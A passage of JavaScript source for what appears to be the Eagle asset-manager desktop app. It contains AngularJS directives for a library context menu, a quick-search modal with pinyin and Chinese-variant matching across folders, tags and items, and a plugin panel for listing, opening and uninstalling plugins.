                                confContextMenu.popup(currentWindow);
                            }
                        },
                        {
                            role: 'separator'
                        },
                        {
                            label: (process.platform == 'darwin') ? i18n.__('appmenu.view>openInFinder') : i18n.__('context.image.openInExplorer'),
                            icon: (process.platform === 'darwin')? 'ic-open-finder.svg': 'ic-open-explorer.svg',
                            click: () => {
                                ipcRenderer.send('show-item-in-folder', item.path);
                            }
                        },
                        {
                            label: i18n.__("dialog.libraryItem.removeFromList"),
                            icon: 'ic-remove-from-list.svg',
                            click: () => {
                                var idx = $scope.listItems.indexOf(item);
                                $scope.listItems.splice(idx, 1);
                                $scope.unpinLibrary(undefined, item);
                                updateLibraryHistory();
                                $scope.$evalAsync();
                            }
                        },
                    ],
                    showSearch: false,
                });
            };

            $scope.pinLibrary = function ($event, item) {
                $event && $event.stopPropagation();
                if ($scope.pinnedLibrary.indexOf(item.path) === -1) {
                    $scope.pinnedLibrary.push(item.path);
                    updatePinnedLibrary();
                }
                $scope.pinnedLibrary = [...new Set($scope.pinnedLibrary)];
                $scope.pinnedLibraryMap[item.path] = true;
            };

            $scope.unpinLibrary = function ($event, item) {
                $event && $event.stopPropagation();
                if ($scope.pinnedLibrary.length === 1) return;
                var idx = $scope.pinnedLibrary.indexOf(item.path);
                if (idx !== -1) {
                    $scope.pinnedLibrary.splice(idx, 1);
                    updatePinnedLibrary();
                }
                $scope.pinnedLibrary = [...new Set($scope.pinnedLibrary)];
                delete $scope.pinnedLibraryMap[item.path];
            };

            $scope.sortableOptions = {
                handle: '> .drag-helper',
                animation: 200,
                distance: 10,
                disabled: false,
                update: function(e, ui) {
                    $timeout(function () {
                        updateLibraryHistory();
                        updatePinnedLibrary();
                    }, 500);
                },
            };

            $searchInput.on("keyup", function (event) {
                var keyCode = event.keyCode;
                switch (keyCode) {
                    case 13: 
                        if (event.metaKey || event.ctrlKey) {
                            event.preventDefault();
                            event.stopPropagation();
                            $scope.close();
                        }
                        else {
                            selectCurrent();
                        }
                        break;
                    case 27:
                        event.stopPropagation();
                        $scope.close();
                        break;
                    // up
                    case 38:
                        event.preventDefault();
                        selectPrev();
                        break;
                    // down
                    case 40:
                        event.preventDefault();
                        selectNext();
                        break;
                    case 9:
                        event.preventDefault();
                        event.stopPropagation();
                        break;
                }
            });
        }
    };
});

EagleApp.directive('quickSearchModal', function ($timeout, $rootScope) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/quick-search-modal.html',
        scope: {},
        link: function ($scope, element, attrs, controllersArr) {
            const $panel = $("#quick-search-panel");
            let $parentScope = $bodyScope;
            $scope.$parentScope = $parentScope;
            $scope.quickSearchKeyword = "";
            $scope.quickSearchHistoryIndex = 0;
            $scope.quickSearchHistory = [];
            $scope.searchMode = "FOLDERS";

            $scope.$on('OPEN_QUICK_SEARCH_MODAL', function (event) {
                if (!$scope.quickSearchIndex) {
                    $scope.quickSearchIndex = 0;
                }
                
                $parentScope.keyword = "";
                $scope.isOpenQuickSearch = true;
                setTimeout(function () {
                    $("#quick-search-input").focus();
                    $(".quick-search .search-result-container").scrollTop(0)
                }, 100);
                setTimeout(function () {
                    $("#quick-search-input").focus();
                }, 200);
                $("#quick-search-input").focus();
                $("#quick-search-input").select();
                $scope.quickSearchKeywordChange();
                // $scope.moveToCursorPosition();
            });

            $scope.$on('CLOSE_QUICK_SEARCH_MODAL', function (event, data) {
                $scope.close();
            });

            if (localStorage.getItem("eagle.quickSearch.history")) {
                $scope.quickSearchHistory = JSON.parse(localStorage.getItem("eagle.quickSearch.history"));
            }

            $scope.close = () => {
                $scope.isOpenQuickSearch = false;
                $("#quick-search-input").blur();
                $rootScope.currentFocus = "content";
            };

            $scope.itemMode = function () {
                $scope.searchMode = "ITEMS";
                $scope.quickSearchKeywordChange();
                $timeout(function () {
                    $("#quick-search-input").focus();
                    $("#quick-search-input").select();
                }, 100);
            };

            $scope.smartFolderMode = function () {
                $scope.searchMode = "SMARTFOLDERS";
                $scope.quickSearchKeywordChange();
                $timeout(function () {
                    $("#quick-search-input").focus();
                    $("#quick-search-input").select();
                }, 100);
            };

            $scope.tagMode = function () {
                $scope.searchMode = "TAGS";
                $scope.quickSearchKeywordChange();
                $timeout(function () {
                    $("#quick-search-input").focus();
                    $("#quick-search-input").select();
                }, 100);
            };

            $scope.folderMode = function () {
                $scope.searchMode = "FOLDERS";
                $scope.quickSearchKeywordChange();
                $timeout(function () {
                    $("#quick-search-input").focus();
                    $("#quick-search-input").select();
                }, 100);
            };

            $scope.getQuickSearchFolderHistory = function () {
                try {
                    if (localStorage.getItem("eagle.quickSearch.folder.history")) {
                        return JSON.parse(localStorage.getItem("eagle.quickSearch.folder.history"));
                    }
                } catch (err) { }
                return [];
            };

            $scope.addQuickSearchFolderHistory = function (folderId) {
                let quickSearchFolderHistory = $scope.getQuickSearchFolderHistory();
                quickSearchFolderHistory.unshift(folderId);
                quickSearchFolderHistory = [...new Set(quickSearchFolderHistory)];
                if (quickSearchFolderHistory.length > 200) {
                    quickSearchFolderHistory.length = 200;
                }
                localStorage.setItem("eagle.quickSearch.folder.history", JSON.stringify(quickSearchFolderHistory));
            };

            $scope.getQuickSearchSmartFolderHistory = function () {
                try {
                    if (localStorage.getItem("eagle.quickSearch.smartFolder.history")) {
                        return JSON.parse(localStorage.getItem("eagle.quickSearch.smartFolder.history"));
                    }
                } catch (err) { }
                return [];
            };

            $scope.addQuickSearchSmartFolderHistory = function (smartFolderId) {
                let quickSearchSmartFolderHistory = $scope.getQuickSearchSmartFolderHistory();
                quickSearchSmartFolderHistory.unshift(smartFolderId);
                quickSearchSmartFolderHistory = [...new Set(quickSearchSmartFolderHistory)];
                if (quickSearchSmartFolderHistory.length > 200) {
                    quickSearchSmartFolderHistory.length = 200;
                }
                localStorage.setItem("eagle.quickSearch.smartFolder.history", JSON.stringify(quickSearchSmartFolderHistory));
            };

            $scope.quickSearchKeywordChange = function () {

                var keyword = $scope.quickSearchKeyword;
                var keyword_cn = chineseConvert.tw2cn(keyword);
                var list = [];

                const cloneWithoutKey = (object, key) => {
                    const { [key]: deletedKey, ...otherKeys } = object;
                    return otherKeys;
                }

                switch ($scope.searchMode) {
                    case 'ITEMS':
                        list = $parentScope.all;
                        break;
                    case 'FOLDERS':
                        // 顯示歷史記錄
                        if (!keyword && $parentScope.folderList.length > 15 && $scope.getQuickSearchFolderHistory().length > 0) {
                            $scope.getQuickSearchFolderHistory().forEach(function (fid) {
                                if (list.length >= 10) return;
                                if ($parentScope.folderMappings[fid]) {
                                    let copy = cloneWithoutKey($parentScope.folderMappings[fid], 'children')
                                    delete copy.$$hashKey;
                                    copy.isRecent = true;
                                    list.push(copy);
                                }
                            });
                        }

                        let folderList = [];
                        let ancestorsCache = {};
                        let guidelinesMap = {};

                        eagle.utils.tree.walk($parentScope.folders, 'children', function(folder, parent, depth) {

                            let item = { ...folder }
                            if (item && parent) {
                                item.parent = parent.id;
                            }

                            // 計算 guidelines 顏色及數量
                            let guidelines = [];
                            if (parent && guidelinesMap[parent.id]) {
                                const parentGuidelines = guidelinesMap[parent.id];
                                guidelines = [...parentGuidelines, item.iconColor || 'normal'];
                            }
                            else {
                                guidelines = [item.iconColor || 'normal'];
                            }
                            guidelinesMap[item.id] = guidelines;

                            // 列表版本 Folders
                            folderList.push(item);
                        });

                        list.push(...folderList);
                        break;

                    case 'TAGS':
                        const tagGroupsIndexMap = {};
                        $parentScope.TagManager.groups.forEach((tagGroup, index) => {
                            tagGroupsIndexMap[tagGroup.id] = index;
                        });
                        list = [...$parentScope.tags];

                        // sort tags by tag.group property
                        list = list.sort((a, b) => {
                            const aGroup = (a.groups[0])? a.groups[0] : undefined;
                            const bGroup = (b.groups[0])? b.groups[0] : undefined;
                            const aGroupIdx = tagGroupsIndexMap[aGroup];
                            const bGroupIdx = tagGroupsIndexMap[bGroup];
                            if (!aGroup && bGroup) return 1;
                            if (aGroup && !bGroup) return -1;
                            if (aGroupIdx < bGroupIdx) return -1;
                            if (aGroupIdx > bGroupIdx) return 1;
                            return 0;
                        });

                        // if group is equal, then sort a-z
                        list = list.sort((a, b) => {
                            const aGroup = (a.groups[0])? a.groups[0] : undefined;
                            const bGroup = (b.groups[0])? b.groups[0] : undefined;
                            const aName = a.name;
                            const bName = b.name;
                            if (aGroup === bGroup) {
                                if (aName < bName) return -1;
                                if (aName > bName) return 1;
                            }
                            return 0;
                        });

                        break;
                    case 'SMARTFOLDERS':
                        if (!keyword && $parentScope.smartFolderList.length > 10 && $scope.getQuickSearchSmartFolderHistory().length > 0) {
                            $scope.getQuickSearchSmartFolderHistory().forEach(function (fid) {
                                if (list.length >= 10) return;
                                if ($parentScope.smartFolderMappings[fid]) {
                                    let copy = cloneWithoutKey($parentScope.smartFolderMappings[fid], 'children')
                                    delete copy.$$hashKey;
                                    delete copy.iconColor;
                                    copy.isRecent = true;
                                    list.push(copy);
                                }
                            });
                        }
                        list.push(...$parentScope.smartFolderList);
                        break;
                }

                if (!keyword) {
                    $scope.quickSearchResult = list;
                }
                else {
                    if ($scope.searchMode !== "ITEMS") {
                        console.time("$scope.quickSearchKeywordChange");
                        const searchItems = list.map(folder => {
                            var folderNameCN = chineseConvert.tw2cn(folder.name);
                            if (keyword.length >= 30 || folder.name.length >= 30) {
                                return {
                                    folder: folder,
                                    name: folderNameCN,
                                    search: [folderNameCN]
                                }
                            }
                            return {
                                folder: folder,
                                name: folderNameCN,
                                search: [folderNameCN, ..._.uniq(
                                    cartesianProduct(pinyinlite(folderNameCN, { keepUnrecognized: true }).filter(p => p.length > 0))
                                        .map(item => item.join(' '))
                                )],
                            };
                        });

                        const scores = searchItems.map(item => {
                            return {
                                item: item,
                                name: item.name,
                                score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                            };
                        })

                        $scope.quickSearchResult = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
                            return i.item.folder;
                        });

                        console.timeEnd("$scope.quickSearchKeywordChange");
                    }
                    else {
                        console.time("$scope.quickSearchKeywordChange");
                        $scope.quickSearchResult = list.filter($scope.searchFilterForQuickSeach);
                        console.timeEnd("$scope.quickSearchKeywordChange");
                    }
                }
            }

            $scope.openQuickSearchResult = function (target) {
                if (target) {
                    if ($scope.searchMode === "FOLDERS") {
                        $parentScope.openFolder(target);
                        $scope.addQuickSearchFolderHistory(target.id);
                        setTimeout(function () { $parentScope.changeSidebarIndex(target); $parentScope.$evalAsync(); }, 200);
                    } else if ($scope.searchMode === "TAGS") {
                        $parentScope.viewMode = undefined;
                        $parentScope.openTag(target.name);
                    } else if ($scope.searchMode === "ITEMS") {
                        let folder = null;
                        if (target.folders && target.folders[0]) {
                            folder = $parentScope.folderMappings[target.folders[0]];
                        }
                        $parentScope.openItemLocation(target, folder);
                    }
                    else {
                        $parentScope.openSmartFolder(target);
                        $scope.addQuickSearchSmartFolderHistory(target.id);
                        setTimeout(function () { $parentScope.changeSidebarIndex(target); $parentScope.$evalAsync(); }, 200);
                    }
                    $scope.saveQuickSearchHistory($scope.quickSearchKeyword);
                    $scope.quickSearchHistoryIndex = 0;
                    $scope.close();
                    analytics.event('QuickSearch', 'Open');
                }
            };

            $scope.saveQuickSearchHistory = function (keyword) {
                if (!keyword) { return };
                $scope.quickSearchHistory.unshift(keyword);
                if ($scope.quickSearchHistory.length >= 100) {
                    $scope.quickSearchHistory.length = 100;
                }
                localStorage.setItem("eagle.quickSearch.history", JSON.stringify($scope.quickSearchHistory));
            };

            $scope.selectQuickSearchResult = function (index) {
                $scope.quickSearchIndex = index;
                $scope.quickScrollEnable = false;
            };

            $scope.quickSeachKeyup = function (event) {

                var keyCode = event.keyCode;
                if (keyCode === 38) {
                    event.preventDefault();
                    $scope.quickScrollEnable = true;
                    if ($scope.quickSearchIndex - 1 >= 0) {
                        $scope.quickSearchIndex = $scope.quickSearchIndex - 1;
                    }
                } else if (keyCode === 40) {
                    event.preventDefault();
                    $scope.quickScrollEnable = true;
                    if ($scope.quickSearchIndex + 1 < $scope.quickSearchResult.length) {
                        $scope.quickSearchIndex = $scope.quickSearchIndex + 1;
                    }
                } else if (keyCode === 27) {
                    event.preventDefault();
                    $scope.close();
                } else if (keyCode === 13) {
                    $scope.openQuickSearchResult($scope.quickSearchResult[$scope.quickSearchIndex])
                } else if (keyCode === 9) {
                    event && event.preventDefault();
                    $scope.quickSearchIndex = 0;
                    if (!event.shiftKey) {
                        if ($scope.searchMode == 'FOLDERS') { $scope.tagMode(); } else if ($scope.searchMode == 'TAGS') { $scope.smartFolderMode(); } else if ($scope.searchMode == 'SMARTFOLDERS') { $scope.itemMode(); } else { $scope.folderMode(); }
                    } else {
                        if ($scope.searchMode == 'FOLDERS') { $scope.itemMode(); } else if ($scope.searchMode == 'TAGS') { $scope.folderMode(); } else if ($scope.searchMode == 'SMARTFOLDERS') { $scope.tagMode(); } else { $scope.smartFolderMode(); }
                    }
                    $scope.quickSearchIndex = 0;
                    $scope.quickSearchHistoryIndex = 0;
                    $(".quick-search .search-result-container").scrollTop(0).trigger("scroll");
                } else {
                    $scope.quickSearchIndex = 0;
                    $scope.quickSearchHistoryIndex = 0;
                    $(".quick-search .search-result-container").scrollTop(0).trigger("scroll");
                }
            };

            $scope.quickSearchFilter = function (folder) {

                var pinyinMatch = false;
                var nameMatch = false;
                if ($scope.quickSearchKeyword == "") return true;

                if (folder) {
                    nameMatch = fuzzy_match(folder.name, $scope.quickSearchKeyword).length > 0;
                    if (nameMatch) return true;

                    var keyword_cn = chineseConvert.tw2cn($scope.quickSearchKeyword);
                    var keyword_tw = chineseConvert.cn2tw($scope.quickSearchKeyword);
                    if (keyword_cn !== keyword_tw) {
                        var nameCNMatch = fuzzy_match(folder.name, keyword_cn).length > 0;
                        if (nameCNMatch) return true;

                        var nameTWMatch = fuzzy_match(folder.name, keyword_tw).length > 0;
                        if (nameTWMatch) return true;
                    }

                    if (folder.pinyin) {
                        pinyinMatch = fuzzy_match(folder.pinyin, $scope.quickSearchKeyword).length > 0;
                    }
                    return nameMatch || pinyinMatch;
                }
                return false;
            };

            $scope.quickSearchOrder = function (folder) {
                if (!$scope.quickSearchKeyword) return;
                var sum = 0;
                var firstB = 0;
                $("<div></div>").append(fuzzy_match(folder.name, $scope.quickSearchKeyword)).contents().each(function (idx) {
                    if (this.tagName == 'B') {
                        if (sum == 0) {
                            firstB = idx;
                        }
                        sum -= Math.pow(2, 10 - idx + firstB);
                    }
                });
                return sum;
            };

            $scope.getThumbnailUrl = function (image) {
                if (!$parentScope.imagesDir || !image) return;
                return FileUrlHelper.getThumbnailUrl(image);
            };

            $scope.searchFilterForQuickSeach = function(image) {
                try {
                    var isMatch = false;
                    var keywords = $scope.quickSearchKeyword.toLowerCase().split(" ");
    
                    for (var i = 0; i < keywords.length; i++) {
    
                        var keyword = keywords[i];
                        var isNotLogic = keyword[0] === "-";
                        var isFullMathLogic = keyword[0] === `"` && keyword[keyword.length - 1] === `"`;
    
                        if (keyword === "-") continue;
    
                        var name = image.name,
                            annotation = image.annotation,
                            ext = image.ext,
                            url = image.url,
                            camera = "",
                            postScriptName = "",
                            allText = "";
    
                        if (image.fontMetas && image.fontMetas.postScriptName) {
                            try {
                                let key = Object.keys(image.fontMetas.postScriptName)[0];
                                postScriptName = image.fontMetas.postScriptName && image.fontMetas.postScriptName[key].toLowerCase() || "";
                            }
                            catch (err) {}
                        }
    
                        if (image.text) {
                            allText += image.text.toLowerCase() + " ";
                        }
    
                        if (image.rawMetas && image.rawMetas.camera) {
                            try {
                                camera = image.rawMetas.camera;
                                allText += `${camera} `;
                            }
                            catch (err) {}
                        }
    
                        if (name && $parentScope.isSearchScopeName) {
                            allText += `${name}`;
                        }
    
                        if (ext && $parentScope.isSearchScopeExt) {
                            allText += `.${ext} `;
                        }
                        
                        if (url && $parentScope.isSearchScopeUrl) {
                            if ($parentScope.keyword.length >= 2) {
                                allText += `${url} `;
                            }
                        }
                        
                        if (annotation && $parentScope.isSearchScopeNote) {
                            allText += `${annotation} `;
                        }
    
                        // 提前判断，如果已经符合，就不需要下面的复杂判断
                        allText = allText.toLowerCase();
    
                        if (isNotLogic) {
                            
                        }
                        else if (isFullMathLogic) {
                            if (name === keyword.replace(/"/g, '')) {
                                isMatch = true;
                                continue;
                            }
                            else {
                                var textArray = name.toLowerCase().split(/[ ，,;、]+/);
                                if (textArray.indexOf(keyword.replace(/"/g, '')) > -1) {
                                    isMatch = true;
                                    continue;
                                }
                                else {
                                    // return false;
                                }
                            }
                        }
                        else {
                            if ( (i18n.locale !== "zh_CN" && i18n.locale !== "zh_TW" && i18n.locale !== "en") || $parentScope.isContainAlphabet) {
                                if (allText.indexOf(keyword) != -1) {
                                    isMatch = true;
                                    continue;
                                }
                                else {
                                    
                                }
                            }
                            else {
                                let keyword = keywords[i];
                                if (allText.indexOf(keyword) != -1) {
                                    isMatch = true;
                                    continue;
                                }
                            }
                        }
    
                        var annotations = "";
                        if ($parentScope.isSearchScopeAnnotation) {
                            if (image.comments) {
                                image.comments.forEach(function(comment) {
                                    annotations += comment.annotation;
                                })
                            }
                            allText += `${annotations} `;
                        }
    
                        var tagsString = "";
                        if ($parentScope.isSearchScopeTag && image.tags && image.tags.length > 0) {
                            for (var ti = 0; ti < image.tags.length; ti++) {
                                if (image.tags[ti]) {
                                    tagsString += `${image.tags[ti]} `;
                                }
                            }
                            allText += `${tagsString} `;
                        }
    
                        // 这个很花时间，如果图片名称就已经符合条件，应立即 return 不该等到这个时间
                        var folderNames = " ";
                        var folderDescriptions = " ";
                        if ($parentScope.isSearchScopeFolderDesc || $parentScope.isSearchScopeFolderName) {
                            if (image.folders && image.folders.length > 0) {
                                for (var fi = 0; fi < image.folders.length; fi++) {
                                    var folderId = image.folders[fi];
                                    var folder = $parentScope.folderMappings[folderId];
                                    if (folder) {
                                        if ($parentScope.isSearchScopeFolderName && folder && folder.name) {
                                            folderNames += `${folder.name} `;
                                        }
                                        if ($parentScope.isSearchScopeFolderDesc && folder.description) {
                                            folderDescriptions += `${folder.description} `;
                                        }
                                    }
                                }
                            }
                            allText += folderNames;
                            allText += folderDescriptions;
                        }
    
                        allText = allText.toLowerCase();
                        
                        if (isNotLogic) {
                            var notKeyword = keyword.replace("-", "");
                            if (notKeyword && allText.indexOf(notKeyword) != -1) {
                                return false;
                            }
                            else {
                                isMatch = true;
                            }
                        }
                        else if (isFullMathLogic) {
                            keyword = keyword.replace(/"/g, '');
                            if (name === keyword) {
                                isMatch = true;
                            }
                            else {
                                var textArray = name.toLowerCase().split(/[ ，,;、]+/);
                                if (textArray.indexOf(keyword) > -1) {
                                    isMatch = true;
                                }
                                else {
                                    return false;
                                }
                            }
                        }
                        else {
    
                            if ( (i18n.locale !== "zh_CN" && i18n.locale !== "zh_TW" && i18n.locale !== "en") || $parentScope.isContainAlphabet) {
                                if (allText.indexOf(keyword) != -1) {
                                    isMatch = true;
                                }
                                else {
                                    return false;
                                }
                            }
                            else {
                                let keyword = keywords[i];
                                if (allText.indexOf(keyword) != -1) {
                                    isMatch = true;
                                }
                                else {
                                    return false;
                                }
                            }
                        }
                    }
    
                    return isMatch;
                }
                catch (err) {}
                return false;
            };
    
        }
    }
});
EagleApp.directive('notSupportPreview', (PluginCenterFactory) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/not-support-preview.html',
        replace: true,
        scope: {
            current: '=current',
            theme: '=theme',
        },
        link: ($scope, element, attrs, controllersArr) => {
            const plugins = PluginCenterFactory.getData().plugins;
            const pluginExtMap = plugins.reduce((acc, plugin) => {
                if (plugin?.exts) {
                    plugin?.exts.forEach(ext => {
                        acc[ext] = true;
                    });
                }
                return acc;
            }, {});
            $scope.hasPlugin = pluginExtMap[$scope.current.ext];
            $scope.openItemContextMenu = $scope.$parent.openItemContextMenu;
            $scope.openPluginCenter = () => {
                currentWindow.webContents.send('open-plugin-center-and-search', $scope.current.ext);
            };
        }
    }
});
EagleApp.directive('pluginPanel', function($timeout, $rootScope, $filter) {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/plugin-panel.html',
        scope: {
            theme: '=theme'
        },
        link: function ($scope, element, attrs, controllersArr) {
			$scope.pluginModule = $scope.$parent.pluginModule;
            $scope.resultList = [];
            $scope.lastOpenedPlugins = [];
            $scope.searchKeyword = "";
            $scope.currentIndex = -1;
            $scope.typeFilter = (localStorage["eagle.pluginPanel.type"])? localStorage["eagle.pluginPanel.type"] : "window";

            var $menu = $("#plugin-panel");
            var $searchInput = $("#plugin-panel-search");

            $scope.$on("UPDATE_PLUGIN_PANEL", function () {
                $scope.calculateList();
				$scope.$evalAsync();
            });

            const moveToCursorPosition = ($elem) => {
                const windowWidth = $(window).width();
                const windowHeight = $(window).height();
                const containerWidth = $elem.width();
                const containerHeight = $elem.height();
                let x = windowMouseX + 10;
                let y = windowMouseY - 10;
                let maxHeight = windowHeight; // 初始化最大高度為視窗高度
            
                if (windowMouseX + containerWidth > windowWidth) {
                    x = windowMouseX - containerWidth - 20;
                    x = x < 20 ? 20 : x;
                }
            
                if (windowMouseY + containerHeight > windowHeight - 20) {
                    y = windowHeight - containerHeight - 20;
                    y = y < 20 ? 20 : y;
                }
                else if (windowMouseY - 56 < 0) {
                    y = 36;
                }
            
                maxHeight = windowHeight - y - 160;
            
                $elem.css({
                    left: `${x}px`,
                    top: `${y}px`,
                });

                // find .plugin-container and set max-height
                $elem.find(".plugin-container").css({
                    'max-height': `${maxHeight - 40}px` // 設定最大高度
                });
            };

            $scope.$on("OPEN_PLUGIN_PANEL", function (event, params) {

                $scope.currentIndex = -1;
                $scope.searchKeyword = "";
                $scope.lastOpenedPlugins = pluginModule.getLastOpenedPlugins().map((pluginId) => {
                    return pluginModule.installedPluginMaps[pluginId];
                });

                $scope.lastOpenedPlugins.length = 3;
                
                $scope.calculateList();

                $timeout(function () {
                    moveToCursorPosition($('#plugin-panel'));
                    $menu.addClass("open");
                    setTimeout(function () {
                        $scope.focusInput();
                    }, 50);
                }, 30);
            });

            $scope.hoverItem = function (index) {
                $scope.currentIndex = index;
            };

            $scope.scrollToTop = function () {
                $menu.find(".plugin-container").scrollTop(0);
            };

            $scope.selectType = function (type) {
                $scope.currentIndex = -1;
                $scope.typeFilter = type;
                localStorage["eagle.pluginPanel.type"] = type;
                $scope.calculateList();
            };

            $scope.installPlugin = () => {
                if ($scope.typeFilter === "window") {
                    $scope.openPluginCenter();
                }
                else if ($scope.typeFilter === "format") {
                    $scope.openPluginCenter('format');
                }
                else if ($scope.typeFilter === "inspector") {
                    $scope.openPluginCenter('inspector');
                }
            };

            $scope.openDevelopmentDocs = () => {
                if (preferences.general.language === "zh_CN") {
                    shell.openExternal('https://developer.eagle.cool/plugin-api/v/zh-cn');
                }
                else {
                    shell.openExternal('https://developer.eagle.cool/plugin-api');
                }
            };

            $scope.calculateList = function () {

				$scope.listItems = [];

				pluginModule.plugins.forEach((plugin) => {
					try {
						const manifest = plugin.manifest;
						$scope.listItems.push({
                            id: `plugin-${plugin.manifest.id}`,
                            type: "plugin",
							icon: `${URL_MODULE.pathToFileURL(`${plugin.path}/${manifest.logo}`).href}?t=${Date.now()}`,
							name: manifest.name,
							dir: manifest?.main?.shortcut || '',
							path: plugin.path,
							executable: !!manifest.main,
							isPreviewPlugin: !!manifest.preview,
							isLocal: plugin.types.includes("development"),
							keyword: `${manifest.name} ${manifest.keywords.join(" ")}`,
                            types: plugin.types,
							plugin: plugin
						});
					}
					catch (err) {
						console.error(err);
					}
				});

                $scope.windowPlugins = $scope.listItems.filter((item) => {
                    return item.types.includes("window");
                });

                // sort by plugin.name
                $scope.listItems = $scope.listItems.sort((a, b) => {
                    return a.name.localeCompare(b.name);
                });

                // 根據類型篩選
                $scope.listItems = $scope.listItems.filter((item) => {
                    return item?.types?.includes($scope.typeFilter);
                });

                if ($scope.searchKeyword !== "") {
                    $scope.resultList = filterPluginItem($scope.listItems, $scope.searchKeyword);

                    if ($scope.resultList.length > 0) {
                        $scope.currentIndex = 0;
                    }
                }
                else {
                    // 顯示最近執行插件
                    if ($scope.windowPlugins.length > 1 && $scope.typeFilter === "window") {
                        $scope.lastOpenedPlugins = $scope.lastOpenedPlugins.filter((plugin) => {
                            return pluginModule.installedPluginMaps[plugin.manifest.id];
                        });
                        let lastOpenedItems = $scope.lastOpenedPlugins.map((plugin) => {
                            return {
                                id: `last-opened-${plugin.manifest.id}`,
                                type: "plugin",
                                icon: `${URL_MODULE.pathToFileURL(`${plugin.path}/${plugin.manifest.logo}`).href}?t=${Date.now()}`,
                                name: plugin.manifest.name,
                                dir: plugin.manifest?.main?.shortcut || '',
                                path: plugin.path,
                                executable: !!plugin.manifest.main,
                                isPreviewPlugin: !!plugin.manifest.preview,
                                isLocal: plugin.types.includes("development"),
                                keyword: `${plugin.manifest.name} ${plugin.manifest.keywords.join(" ")}`,
                                types: plugin.types,
                                plugin: plugin
                            };
                        });

                        if (lastOpenedItems.length > 3) lastOpenedItems.length = 3;

                        $scope.listItems = $scope.listItems.filter((item) => {
                            return !lastOpenedItems.find((lastOpenedItem) => {
                                return lastOpenedItem?.plugin?.manifest?.id === item?.plugin?.manifest?.id;
                            });
                        });
    
                        $scope.listItems = [{ id: "label", type: "label", name: i18n.__('modal.pluginPanel.label.recent') }, ...lastOpenedItems, { id: "separator", type: "separator" }, ...$scope.listItems];
                        $scope.currentIndex = 1;
                    }

                    $scope.resultList = $scope.listItems.unique();
                }
            }

            $scope.focusInput = function () {
                $searchInput.focus();
            };

            $scope.close = function () {
                $scope.scrollToTop();
                $menu.removeClass("open");
                $searchInput.blur();
                $scope.scrollToTop();
            };

            $scope.onItemClick = function (item) {
                const plugin = item?.plugin;
				if (!item.executable) {
					const file = $bodyScope.selected[0];
					const ext = file?.ext;
                    const keys = Object.keys(plugin?.manifest?.preview);
                    if (!plugin?.manifest?.preview?.[keys]?.viewer) return;
                    for (const key of keys) {
                        if (key.includes(ext)) {
                            pluginModule.openPreview(plugin, file);
                            $scope.close();
                            return;
                        }
                    }
				}
				else {
					pluginModule.open(plugin);
					$scope.close();
				}
            };

            function filterPluginItem (items, keyword) {

                if (!keyword) return items;
                var keyword_cn = chineseConvert.tw2cn(keyword);

                var temp = items.map(item => {
                    var nameCN = chineseConvert.tw2cn(item.keyword);
                    if (keyword.length >= 30 || item.keyword.length >= 30) {
                        return {
                            item: item,
                            name: nameCN,
                            search: [nameCN]
                        }
                    }
                    return {
                        item: item,
                        name: nameCN,
                        search: [nameCN, ..._.uniq(
                            cartesianProduct(pinyinlite(nameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                            .map(item => item.join(' '))
                        )],
                    };
                });

                var scores = temp.map(item => {
                    return {
                        item: item,
                        name: item.keyword,
                        score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
                    };
                })
                
                var result = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
                    return i.item.item;
                });

                // 依據 keyword 的 indexof 來排序, 如果=-1則不改變順序
                const keywordLower = keyword.toLowerCase();
                result = result.sort((a, b) => {
                    var indexA = a.name.toLowerCase().indexOf(keywordLower);
                    var indexB = b.name.toLowerCase().indexOf(keywordLower);
                    if (indexA === -1 && indexB === -1) return 0;
                    if (indexA === -1) return 1;
                    if (indexB === -1) return -1;
                    return indexA - indexB;
                });

                return result;
            }

            function selectCurrent () {
                if ($scope.resultList[$scope.currentIndex]) {
                    $scope.onItemClick($scope.resultList[$scope.currentIndex]);
                    $scope.$evalAsync();
                }
            };

            function selectPrev () {
                if ($scope.currentIndex > 0) {
                    $scope.currentIndex--;
                    if ($scope.resultList[$scope.currentIndex]?.type !== "plugin") {
                        selectPrev();
                    }
                    $scope.$evalAsync();
                }
            };

            function selectNext () {
                if ($scope.currentIndex < $scope.resultList.length - 1) {
                    $scope.currentIndex++;
                    if ($scope.resultList[$scope.currentIndex]?.type !== "plugin") {
                        selectNext();
                    }
                    $scope.$evalAsync();
                }
            };

            function removePlugin (item) {

                let desc = $filter('i18n')('dialog.removePlugin.desc', [
                    { "property": "name", "value": item.name },
                ]);
                let theme  = $filter('themePath')($bodyScope.theme);

                swal({
                    html: `
                        <div class="alert">
                            <div class="alert-icon" style="background-image: url('${item.icon}')">
                                <img class="status" style="width: 20px; height: 20px;" src="assets/images/${theme}/icons/ic-plugin-install-modal-uninstall.svg">
                            </div>
                            <h4 class="alert-title">${i18n.__('dialog.removePlugin.title')}</h4>
                            <p class="alert-desc">${desc}</p>
                        </div>
                    `,
                    showCloseButton: false, showConfirmButton: true, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                    width: 400,
                    customClass: "alert-box large",
                    cancelButtonColor: "#777777",
                    confirmButtonText: `${i18n.__('dialog.removePlugin.remove')}`,
                    cancelButtonText: i18n.__("general.cancel"),
                }).then(async () => {
                    if (item.isLocal) {
                        pluginModule.localPlugin.uninstall(item.plugin);
                    }
                    else {
                        pluginModule.remotePlugin.uninstall(item.plugin);
                    }
                    $scope.calculateList();
                });
            }

            $scope.pinPlugin = ($event, item) => {
                $event.stopPropagation();
                pluginModule.pinPlugin(item.plugin);
            };

            $scope.unpinPlugin = ($event, item) => {
                $event.stopPropagation();
                pluginModule.unpinPlugin(item.plugin);
            };

            $scope.openSubmenu = function ($event, item) {
                $event.stopPropagation();

                let newPlugin = pluginModule.needUpdatePluginMaps[item.plugin.manifest.id];

                ContextMenu.open({
                    items: [
                        { 
                            label: `${item.plugin.manifest.name} (${item.plugin.manifest.version})`,
                            disabled: true
                        },
                        {
                            role: 'separator'
                        },
                        // 本地插件
                        { 
                            visible: !!item.isLocal,
                            label: i18n.__('modal.pluginPanel.contextMenu.reload'),
                            click: () => {
                                pluginModule.reloadPlugin(item.plugin.path);
                            }
                        },
                        { 
